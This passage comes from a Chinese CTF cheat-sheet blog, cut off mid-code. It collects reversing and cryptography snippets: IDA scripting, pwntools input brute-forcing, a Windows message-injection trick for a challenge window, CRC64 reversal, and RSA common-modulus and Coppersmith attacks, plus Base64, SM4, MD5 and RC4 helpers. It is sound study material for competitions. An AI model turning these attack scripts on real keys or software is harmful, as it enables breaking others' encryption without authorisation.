class="line"><span class="comment">//PatchByte(addr+i,Byte());</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul><li><p>idc</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取寄存器的值</span></span><br><span class="line"><span class="keyword">auto</span> eax = <span class="built_in">GetRegValue</span>(<span class="string">&quot;EAX&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取字节值ida_bytes.get_word()</span></span><br><span class="line">value = ida_bytes.get_word(address)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="C-板子"><a href="#C-板子" class="headerlink" title="C++板子"></a>C++板子</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数字前后bit替换"><a href="#数字前后bit替换" class="headerlink" title="数字前后bit替换"></a>数字前后bit替换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">swap_bit</span>(<span class="params">num</span>):</span><br><span class="line">    temp = <span class="built_in">bin</span>(num)[<span class="number">2</span>:]</span><br><span class="line">    temp = <span class="built_in">str</span>(temp).zfill(<span class="number">8</span>)</span><br><span class="line">    temp = temp[<span class="number">3</span>:] + temp[:<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(temp,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h2 id="爆破程序输入"><a href="#爆破程序输入" class="headerlink" title="爆破程序输入"></a>爆破程序输入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    io = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;input:\n&#x27;</span>)</span><br><span class="line">    i = <span class="built_in">str</span>(i)</span><br><span class="line">    io.sendline(i.encode())</span><br><span class="line">    res=io.recvline()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Yes&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><h2 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h2><ul><li>hackgame2022 flag自动机</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    HWND target = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取窗口句柄</span></span><br><span class="line">    target = <span class="built_in">FindWindowW</span>(<span class="string">L&quot;flag 自动机&quot;</span>, <span class="string">L&quot;flag 自动机&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (target == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    <span class="built_in">PostMessageW</span>(target, <span class="number">0x111</span>, <span class="number">3</span>, <span class="number">114514</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CRC32解密"><a href="#CRC32解密" class="headerlink" title="CRC32解密"></a>CRC32解密</h2><ul><li>RoarCTF2019 polyre</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">secret = [<span class="number">0xBC8FF26D43536296</span>, <span class="number">0x520100780530EE16</span>, <span class="number">0x4DC0B5EA935F08EC</span>,</span><br><span class="line">          <span class="number">0x342B90AFD853F450</span>, <span class="number">0x8B250EBCAA2C3681</span>, <span class="number">0x55759F81A2C68AE4</span>]</span><br><span class="line">key = <span class="number">0xB0004B7679FA26B3</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"># 产生CRC32查表法所用的表</span><br><span class="line"><span class="keyword">for</span> s in secret:</span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        sign = s &amp; <span class="number">1</span>                   #判断首位正负</span><br><span class="line">        <span class="keyword">if</span> sign == <span class="number">1</span>:</span><br><span class="line">            s ^= key</span><br><span class="line">        s <span class="comment">//= 2</span></span><br><span class="line">        <span class="keyword">if</span> sign == <span class="number">1</span>:</span><br><span class="line">            s |= <span class="number">0x8000000000000000</span>    # 防止负值除<span class="number">2</span>，溢出为正值</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(s))                      # 输出表</span><br><span class="line">    # 计算CRC64</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; <span class="number">8</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(s&amp;<span class="number">0xFF</span>)</span><br><span class="line">        s &gt;&gt;= <span class="number">8</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="Z3约束求解"><a href="#Z3约束求解" class="headerlink" title="Z3约束求解"></a>Z3约束求解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line">s = z3.Solver()</span><br><span class="line"><span class="comment"># Generate an empty list with the same length as the flag</span></span><br><span class="line">flag = [z3.Int(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>)]</span><br><span class="line"><span class="comment"># add constraint condition</span></span><br><span class="line">s.add()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Solve</span></span><br><span class="line">r = s.check()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">repr</span>(r) == <span class="string">&#x27;sat&#x27;</span>:</span><br><span class="line">    result = s.model()</span><br><span class="line"><span class="comment"># result = [k!15 = 95,k!0 = 112,...]</span></span><br><span class="line"><span class="comment"># Replace flag with corresponding subscripts and values</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> result:</span><br><span class="line">        index = <span class="built_in">int</span>(<span class="built_in">str</span>(k).replace(<span class="string">&#x27;k!&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        flag[index] = result[k].as_long()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># Generate chr()flag</span></span><br><span class="line">    <span class="comment">#print(&#x27;&#x27;.join([chr(x) for x in flag]))</span></span><br></pre></td></tr></table></figure><h3 id="因数分解pollard-rho"><a href="#因数分解pollard-rho" class="headerlink" title="因数分解pollard_rho"></a>因数分解pollard_rho</h3><p><a href="https://blog.csdn.net/DeepStarSky/article/details/107742342?ops_request_misc=%7B%22request_id%22:%22168345187416800188560866%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168345187416800188560866&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107742342-null-null.142%5Ev86%5Einsert_down1,239%5Ev2%5Einsert_chatgpt&utm_term=Pollard_rho&spm=1018.2226.3001.4187">(34条消息) pollard_rho算法_DeepStarSky的博客-CSDN博客</a></p><h3 id="sha1加密"><a href="#sha1加密" class="headerlink" title="sha1加密"></a>sha1加密</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">origin = <span class="built_in">input</span>()</span><br><span class="line">temp = hashlib.<span class="built_in">sha1</span>(origin.<span class="built_in">encode</span>())</span><br><span class="line"><span class="built_in">print</span>(temp.<span class="built_in">hexdigest</span>())</span><br></pre></td></tr></table></figure><h3 id="求模乘逆元"><a href="#求模乘逆元" class="headerlink" title="求模乘逆元"></a>求模乘逆元</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># e*d mod φ(n) = 1</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="string">&#x27;e&#x27;</span></span><br><span class="line">phi = <span class="string">&#x27;φ(n)&#x27;</span></span><br><span class="line">d = gmpy2.<span class="built_in">invert</span>(e,phi)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><h3 id="RSA共模攻击"><a href="#RSA共模攻击" class="headerlink" title="RSA共模攻击"></a>RSA共模攻击</h3><ul><li><p>使用同一个模数n</p></li><li><p>用两个不同的公钥e1、e2对同一段明文m进行加密得到两份密文c1、c2</p></li><li><p>解密公式：</p><blockquote><p>m &#x3D; (c1s1 % n * c2s2 % n) % n</p></blockquote></li><li><p>公式推导：</p><ul><li>由共模可推出<ul><li>me1 % n &#x3D; c1</li><li>me2 % n &#x3D; c2</li></ul></li><li>欧几里得扩展算法取s1、s2使得<ul><li>e1 * s1 + e2 * s2 &#x3D; 1</li></ul></li><li>m &#x3D; m(e1<em>s1+e2</em>s2) % n</li><li>m &#x3D; (c1s1 % n * c2s2 % n) % n</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span>  binascii</span><br><span class="line">c1 =</span><br><span class="line">n =</span><br><span class="line">e1 =</span><br><span class="line">c2 =</span><br><span class="line">e2 =</span><br><span class="line">r,s1,s2 = gmpy2.<span class="built_in">gcdext</span>(e1, e2)    # 扩展欧几里得算法</span><br><span class="line"># 公式</span><br><span class="line">m = (gmpy2.<span class="built_in">powmod</span>(c1,s1,n)*gmpy2.<span class="built_in">powmod</span>(c2,s2,n)) % n   # 计算明文m</span><br><span class="line">m = <span class="built_in">hex</span>(m)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(binascii.<span class="built_in">unhexlify</span>(m))</span><br></pre></td></tr></table></figure><h3 id="RSA已知p高位攻击"><a href="#RSA已知p高位攻击" class="headerlink" title="RSA已知p高位攻击"></a>RSA已知p高位攻击</h3><ul><li><p>生成模式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">from gmpy2 <span class="keyword">import</span> *</span><br><span class="line">from secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">e=</span><br><span class="line">c=</span><br><span class="line">m=<span class="built_in">bytes_to_long</span>(flag)</span><br><span class="line">p=<span class="built_in">getprime</span>(<span class="number">512</span>)</span><br><span class="line">q=<span class="built_in">getprime</span>(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&#123;&#125;&quot;</span>.format(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&#123;&#125;&quot;</span>.format(c))</span><br><span class="line">tmp=random.<span class="built_in">randint</span>(<span class="number">100</span>,<span class="number">300</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p&gt;&gt;tmp=&#123;&#125;&quot;</span>.format(p&gt;&gt;tmp))</span><br><span class="line"><span class="meta">#c=6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#n=102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#p&gt;&gt;200=8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857</span></span><br></pre></td></tr></table></figure></li><li><p>sage脚本求p</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">p = </span><br><span class="line">p = p &lt;&lt; bits<span class="comment">//bits为求解位数，比如已知312位p2，p为512位，bits = 200</span></span><br><span class="line">PR. = <span class="built_in">PolynomialRing</span>(<span class="built_in">Zmod</span>(n))</span><br><span class="line">f = x + p</span><br><span class="line">roots = f.<span class="built_in">small_roots</span>(X=<span class="number">2</span> ^ bits,beta = <span class="number">0.4</span>)</span><br><span class="line"><span class="built_in">print</span>(roots)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure></li></ul><h3 id="RSA已知明文m高位攻击"><a href="#RSA已知明文m高位攻击" class="headerlink" title="RSA已知明文m高位攻击"></a>RSA已知明文m高位攻击</h3><ul><li><p>生成模式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">from secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">flag=<span class="string">&quot;UNCTF&#123;*************************&#125;&quot;</span> </span><br><span class="line">m=libnum.<span class="built_in">s2n</span>(flag)</span><br><span class="line">p=libnum.<span class="built_in">generate_prime</span>(<span class="number">1024</span>)</span><br><span class="line">q=libnum.<span class="built_in">generate_prime</span>(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">6</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">M=((m&gt;&gt;<span class="number">60</span>)&lt;&lt;<span class="number">60</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;((m&gt;&gt;60)&lt;&lt;60)=&quot;</span>,M) </span><br></pre></td></tr></table></figure></li><li><p>sage求解m</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">high_m = </span><br><span class="line">R.&lt;x&gt; = <span class="built_in">PolynomialRing</span>(<span class="built_in">Zmod</span>(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">m = high_m + x</span><br><span class="line">M = <span class="built_in">m</span>((m^<span class="number">6</span> - c).<span class="built_in">small_roots</span>()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(M))[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure></li><li><p>python还原m</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">M =</span><br><span class="line"><span class="built_in">print</span>(libnum.<span class="built_in">n2s</span>(M))</span><br></pre></td></tr></table></figure></li></ul><h3 id="Base64变表解密"><a href="#Base64变表解密" class="headerlink" title="Base64变表解密"></a>Base64变表解密</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"># 原表</span><br><span class="line">origin = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"># 变表</span><br><span class="line">base = <span class="string">&#x27;yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx&#x27;</span></span><br><span class="line"># 密文</span><br><span class="line">c = <span class="string">&#x27;1ovhXETgZUDgXFS=&#x27;</span></span><br><span class="line"># 映射表</span><br><span class="line">table = str.<span class="built_in">maketrans</span>(base,origin)</span><br><span class="line"># 明文</span><br><span class="line">m = <span class="built_in">str</span>(base64.<span class="built_in">b64decode</span>(c.<span class="built_in">translate</span>(table)),encoding=(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><h3 id="SM4解密"><a href="#SM4解密" class="headerlink" title="SM4解密"></a>SM4解密</h3><ul><li>题目部分解密源码</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from libnum <span class="keyword">import</span> s2n, n2s</span><br><span class="line">from pysm4 <span class="keyword">import</span> decrypt</span><br><span class="line">cipher = <span class="number">119384314703134531538573762305905297230</span></span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line">sm4_key = <span class="built_in">s2n</span>(b<span class="string">&quot;where_are_u_now?&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">n2s</span>(<span class="built_in">decrypt</span>(cipher, sm4_key)).<span class="built_in">decode</span>())</span><br></pre></td></tr></table></figure><h3 id="MD5加密"><a href="#MD5加密" class="headerlink" title="MD5加密"></a>MD5加密</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"># 待加密信息</span><br><span class="line">str = <span class="string">&#x27;this is a md5 test.&#x27;</span></span><br><span class="line"></span><br><span class="line"># 创建md5对象</span><br><span class="line">hl = hashlib.<span class="built_in">md5</span>()</span><br><span class="line">hl.<span class="built_in">update</span>(str.<span class="built_in">encode</span>(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;MD5加密前为 ：&#x27;</span> + str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;MD5加密后为 ：&#x27;</span> + hl.<span class="built_in">hexdigest</span>())</span><br></pre></td></tr></table></figure><h3 id="RC4加密"><a href="#RC4加密" class="headerlink" title="RC4加密"></a>RC4加密</h3><ul><li>密钥长度可变，加解密同一套代码</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> longULONG;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*初始化函数*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *s, <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">unsigned</span> <span class="type">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> k[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i % len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*加解密*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *s, <span class="type">unsigned</span> <span class="type">char</span> *Data, <span class="type">unsigned</span> <span class="type">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; len; k++)&#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="type">char</span> key[<span class="number">256</span>] = &#123;<span class="string">&quot;justfortest&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">//密文十六进制形式</span></span><br><span class="line">    <span class="type">int</span> pata[<span class="number">512</span>] = &#123;<span class="number">0x10</span>,<span class="number">0xa8</span>,<span class="number">0x1</span>,<span class="number">0x36</span>,<span class="number">0xa0</span>,<span class="number">0x48</span>,<span class="number">0x6a</span>,<span class="number">0xb6</span>,<span class="number">0xdb</span>,<span class="number">0xf1</span>,<span class="number">0x64</span>,<span class="number">0xad</span>,<span class="number">0x84</span>,<span class="number">0x59</span>,<span class="number">0x2</span>,<span class="number">0x9d</span>,<span class="number">0x8a</span>,<span class="number">0x54</span>,<span class="number">0x9e</span>,<span class="number">0xc2</span>,<span class="number">0x4d</span>,<span class="number">0x27</span>&#125;;</span><br><span class="line">    <span class="comment">//转换为字符串形式</span></span><br><span class="line">    <span class="type">char</span> pData[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; pata[i]; i++)&#123;</span><br><span class="line">    pData[i] = (<span class="type">char</span>)pata[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">rc4_init</span>(s, (<span class="type">unsigned</span> <span class="type">char</span>*)key, <span class="built_in">strlen</span>(key));<span class="comment">//已经完成了初始化</span></span><br><span class="line">    <span class="built_in">rc4_crypt</span>(s, (<span class="type">unsigned</span> <span class="type">char</span>*)pData, <span class="built_in">strlen</span>(pData));<span 